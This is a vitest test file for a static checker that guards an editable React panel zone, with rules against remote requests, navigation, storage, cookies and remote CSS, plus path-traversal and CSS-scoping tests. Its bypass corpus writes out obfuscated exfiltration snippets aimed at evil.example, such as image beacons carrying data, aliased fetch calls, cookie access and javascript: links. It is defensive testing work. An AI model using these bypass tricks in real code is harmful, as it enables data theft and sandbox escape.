import * as esbuild from 'esbuild-wasm'
import { describe, expect, it } from 'vitest'
import { cssRules, decodeMappings, parseProtected, staticCheck, type CheckContext, type TransformFn } from '../src/check.js'
import { isComponentExport } from '../src/component.js'
import { scopeZoneCss, layeredCss } from '../src/css-scope.js'
import { isWritablePath, validateZoneGlob } from '../src/paths.js'

const transform: TransformFn = (s, o) => esbuild.transform(s, o)
const ctx: CheckContext = { dynamicRoots: ['src/dynamic/'], externals: [], externalPatterns: ['react', 'react/jsx-runtime', '@/components/ui/*', '@/lib/utils', '@/readonly/*'] }
const rules = async (body: string, extra: Partial<CheckContext> = {}, file = 'src/dynamic/panel.tsx') =>
  (await staticCheck({ [file]: body }, { ...ctx, ...extra }, transform)).map((e) => e.rule)
const inPanel = (code: string) => `export default function P({ data }: { data: any }) { ${code}; return null }`

describe('static check: the bypass corpus (code review 06 §2 test 4, brainstorm 04 §7, 05 #1)', () => {
  it.each([
    ['protocol-relative fetch via template', 'const x = data.host; fetch(`/${x}`)', 'no-computed-url'],
    ['backslash host', "fetch('/\\\\evil.example/x')", 'no-remote-request'],
    ['fetch aliased', 'const f = fetch; f("https://evil")', 'no-remote-request'],
    ['fetch.call', "fetch.call(null, 'https://evil')", 'no-remote-request'],
    ['window.fetch aliased', 'const f = window.fetch', 'no-remote-request'],
    ['new Image().src', "new Image().src = 'https://evil.example/?' + data", 'no-remote-request'],
    ['element.src assignment', "const img = document.getElementById('x') as any; img.src = 'https://evil.example/p.gif'", 'no-remote-request'],
    ['setAttribute src', "document.body.setAttribute('src', 'https://evil.example')", 'no-remote-request'],
    ['location.href =', "location.href = 'https://evil.example'", 'no-navigation'],
    ['location.assign', "window.location.assign('https://evil.example')", 'no-navigation'],
    ['location aliased', 'const l = location; l.href = "x"', 'no-navigation'],
    ['window.open', "window.open('https://evil.example')", 'no-navigation'],
    ['computed member on window', 'const k = "fe" + "tch"; (window as any)[k]("x")', 'no-computed-global'],
    ['globalThis[atob]', "(globalThis as any)[atob('ZmV0Y2g=')]('https://evil')", 'no-computed-global'],
    ["document['coo'+'kie'] (esbuild folds it)", "const c = (document as any)['coo' + 'kie']", 'no-document-cookie'],
    ['document[computed]', 'const c = (document as any)[data.k]', 'no-computed-global'],
    ['destructured cookie', 'const { cookie } = document', 'no-global-alias'],
    ['document aliased', 'const d = document; d.title', 'no-global-alias'],
    ['localStorage', "localStorage.setItem('k', 'v')", 'no-storage'],
    ['window.sessionStorage', "window.sessionStorage.getItem('k')", 'no-storage'],
    ['indexedDB', "indexedDB.open('x')", 'no-storage'],
    ['[].constructor.constructor', "[].constructor.constructor('return 1')()", 'no-constructor-access'],
    ['window.top', 'window.top!.postMessage(data, "*")', 'no-cross-window'],
    ['parent postMessage', 'parent.postMessage(data, "*")', 'no-cross-window'],
    ['new Worker', "new Worker('/w.js')", 'no-worker'],
    ['createElement script', "document.createElement('script')", 'no-raw-html'],
    ['React.createElement', "const React: any = {}; React.createElement('img', { src: 'https://evil' })", 'no-raw-html'],
    ['style url() absolute', "const s = { backgroundImage: 'url(https://evil.example/p.png)' }", 'no-remote-css'],
    ['style url() computed', 'const s = { backgroundImage: `url(${data.u})` }', 'no-remote-css'],
    ['Tailwind bg-[url()]', "const cls = 'bg-[url(https://evil.example/p.png)] p-2'", 'no-remote-css'],
    ['string timer via window', "window.setTimeout('alert(1)', 1)", 'no-string-timer'],
  ])('%s', async (_name, code, rule) => {
    expect(await rules(inPanel(code))).toContain(rule)
  })

  it.each([
    ['img src absolute', '<img src="https://evil.example/p.png" />', 'no-remote-request'],
    ['img src computed', '<img src={data.avatar} />', 'no-computed-url'],
    ['iframe src', '<iframe src="https://evil.example" />', 'no-remote-request'],
    ['link href', '<link rel="stylesheet" href="//evil.example/x.css" />', 'no-remote-request'],
    ['form action', '<form action="https://evil.example/collect"><input name="x" /></form>', 'no-remote-request'],
    ['button formAction', '<button formAction="https://evil.example">x</button>', 'no-remote-request'],
    ['javascript: href', '<a href="javascript:alert(1)">x</a>', 'no-computed-url'],
    ['obfuscated javascript: href', '<a href={" jav\\tascript:alert(1)"}>x</a>', 'no-computed-url'],
    ['a href computed', '<a href={data.url}>x</a>', 'no-computed-url'],
    ['srcDoc', '<iframe srcDoc="<script>1</script>" />', 'no-raw-html'],
    ['script tag', '<script>{"x"}</script>', 'no-raw-html'],
    ['style tag', '<style>{"body{display:none}"}</style>', 'no-raw-html'],
    ['object tag', '<object data="https://evil.example/x" />', 'no-raw-html'],
    ['inline style url', `<div style={{ background: 'url(//evil.example/p.png)' }} />`, 'no-remote-css'],
  ])('JSX: %s', async (_name, jsx, rule) => {
    expect(await rules(`export default function P({ data }: { data: any }) { return <>${jsx}</> }`)).toContain(rule)
  })

  it('keeps ordinary panel code clean', async () => {
    const ok = `import { useState } from 'react'
import { Button } from '@/components/ui/button'
export default function P({ data }: { data: { id: string; parent?: string } }) {
  const [open, setOpen] = useState(false)
  const parent = data.parent
  const path = location.pathname
  if (typeof window !== 'undefined') window.addEventListener('resize', () => setOpen(false))
  const counts: Record<string, number> = {}
  counts[data.id] = 1
  fetch('/api/customers/' + data.id)
  fetch(\`/api/deals/\${data.id}\`)
  return (
    <div className="bg-[url(/img/bg.png)] p-2" style={{ color: 'red' }}>
      <a href={\`/customers/\${data.id}\`}>open</a>
      <a href="mailto:support@example.com">mail</a>
      <a href="#top">top</a>
      <img src="/logo.png" alt="" />
      <Button onClick={() => setOpen(!open)}>{parent}{path}</Button>
    </div>
  )
}`
    expect(await rules(ok)).toEqual([])
  })

  it('maps positions back to the TypeScript source line', async () => {
    const src = `type A = { x: number }\ninterface B { y: string }\nexport default function P(): null {\n  const a: A = { x: 1 }\n  localStorage.getItem('k')\n  return null\n}`
    const [e] = await staticCheck({ 'src/dynamic/p.tsx': src }, ctx, transform)
    expect(e).toMatchObject({ line: 5, rule: 'no-storage' })
  })

  it('checks CSS files of the zone: remote url(), @import, global and pleatkit selectors', () => {
    const r = (css: string) => cssRules('src/dynamic/x.css', css, {}).map((e) => e.rule)
    expect(r('.card { background: url(https://evil.example/a.png) }')).toEqual(['no-remote-css'])
    expect(r('.card { background: url("//evil.example/a.png") }')).toEqual(['no-remote-css'])
    expect(r('@import "https://evil.example/x.css";')).toEqual(['no-remote-css'])
    expect(r('body { display: none }')).toEqual(['no-global-css'])
    expect(r(':root { --x: 1 }')).toEqual(['no-global-css'])
    expect(r('.mk-root { display: none }')).toEqual(['no-global-css'])
    expect(r('.card { background: url(/img/a.png); color: red } @media (max-width: 600px) { .card { padding: 0 } }')).toEqual([])
    expect(r('.card { background: url(data:image/png;base64,AAAA) }')).toEqual([])
  })

  it('CSS files are checked by staticCheck too', async () => {
    const errs = await staticCheck({ 'src/dynamic/x.css': 'html { background: url(https://evil.example) }' }, ctx, transform)
    expect(errs.map((e) => e.rule).sort()).toEqual(['no-global-css', 'no-remote-css'])
  })
})

describe('protected elements (brainstorm 05 #20)', () => {
  const base = { 'src/dynamic/signup.tsx': `export default function S() { return <form><label data-consent>I agree</label><p className="legal text-sm">Terms</p></form> }` }
  const pctx = { ...ctx, protected: ['[data-consent]', '.legal'], base }
  it('parses attribute, class and id selectors', () => {
    expect(parseProtected(['[data-consent]', '[data-x="1"]', '.legal', '#terms', 'div > p'])).toHaveLength(4)
  })
  it('refuses removing or hiding a protected element, allows other changes', async () => {
    const check = async (src: string) => (await staticCheck({ 'src/dynamic/signup.tsx': src }, pctx, transform)).map((e) => e.rule)
    expect(await check(`export default function S() { return <form className="p-4"><label data-consent>I agree</label><p className="legal text-sm">Terms</p></form> }`)).toEqual([])
    expect(await check(`export default function S() { return <form><p className="legal">Terms</p></form> }`)).toEqual(['protected-element'])
    expect(await check(`export default function S() { return <form><label data-consent hidden>I agree</label><p className="legal">T</p></form> }`)).toEqual(['protected-element'])
    expect(await check(`export default function S() { return <form><label data-consent style={{ opacity: 0 }}>I agree</label><p className="legal">T</p></form> }`)).toEqual(['protected-element'])
    expect(await check(`export default function S() { return <form><label data-consent>I agree</label><p className="legal sr-only">T</p></form> }`)).toEqual(['protected-element'])
  })
  it('refuses CSS aimed at a protected element and removing its file', async () => {
    const errs = await staticCheck({ 'src/dynamic/x.css': '[data-consent] { display: none }' }, pctx, transform)
    expect(errs.map((e) => e.rule)).toContain('protected-element')
  })
})

describe('default exports: one rule for browser and server', () => {
  const panel = 'src/dynamic/p.tsx'
  const kind = async (src: string, files: Record<string, string> = {}) => (await staticCheck({ [panel]: src, ...files }, ctx, transform, { components: [panel] })).filter((e) => e.rule === 'default-export').length
  it.each([
    ['function', 'export default function P() { return null }', 0],
    ['arrow const', 'const P = () => null\nexport default P', 0],
    ['memo call', "import { memo } from 'react'\nexport default memo(() => null)", 0],
    ['re-export', "export { default } from './q'", 0],
    ['number', 'export default 42', 1],
    ['string', "export default 'x'", 1],
    ['plain object', 'export default {}', 1],
    ['const number', 'const n = 1\nexport default n', 1],
    ['named only', 'export function P() { return null }', 1],
  ])('%s', async (_n, src, errors) => {
    expect(await kind(src, { 'src/dynamic/q.tsx': 'export default function Q() { return null }' })).toBe(errors)
  })
  it('the runtime check agrees on evaluated values', () => {
    expect(isComponentExport(() => null)).toBe(true)
    expect(isComponentExport({ $$typeof: Symbol.for('react.memo'), type: () => null })).toBe(true)
    expect(isComponentExport(42)).toBe(false)
    expect(isComponentExport({})).toBe(false)
  })
})

describe('paths and CSS scoping', () => {
  it('refuses Windows paths and traversal, validates zone globs', () => {
    expect(isWritablePath('src/dynamic/a.tsx', ['src/dynamic/'])).toBe(true)
    expect(isWritablePath('src\\dynamic\\a.tsx', ['src/dynamic/'])).toBe(false)
    expect(isWritablePath('src/dynamic/../core/a.tsx', ['src/dynamic/'])).toBe(false)
    expect(isWritablePath('/src/dynamic/a.tsx', ['src/dynamic/'])).toBe(false)
    expect(validateZoneGlob('./src/dynamic/**')).toEqual({ glob: 'src/dynamic/**', problems: [] })
    expect(validateZoneGlob('src\\dynamic\\**').problems).toHaveLength(1)
    expect(validateZoneGlob('/abs/src/**').problems.length).toBeGreaterThan(0)
    expect(validateZoneGlob('**/*.tsx').problems.length).toBeGreaterThan(0)
  })
  it('scopes zone CSS to panels and layers edit CSS under the host', () => {
    const scoped = scopeZoneCss('@keyframes spin { to { transform: rotate(1turn) } }\nbody { display: none }\n.card { color: red }')
    expect(scoped).toMatch(/^@keyframes spin/)
    expect(scoped).toContain('@scope ([data-pleatkit-id]) {\nbody { display: none }\n.card { color: red }\n}')
    const layered = layeredCss('@property --tw-x { syntax: "*"; inherits: false }\n@layer utilities { .p-2 { padding: 8px } }')
    expect(layered.startsWith('@property --tw-x')).toBe(true)
    expect(layered).toContain('@layer pleatkit-edits {\n@layer utilities')
  })
  it('decodes source maps', () => {
    expect(decodeMappings('AAAA;AACA')[1]![0]).toEqual([0, 1, 0])
  })
})
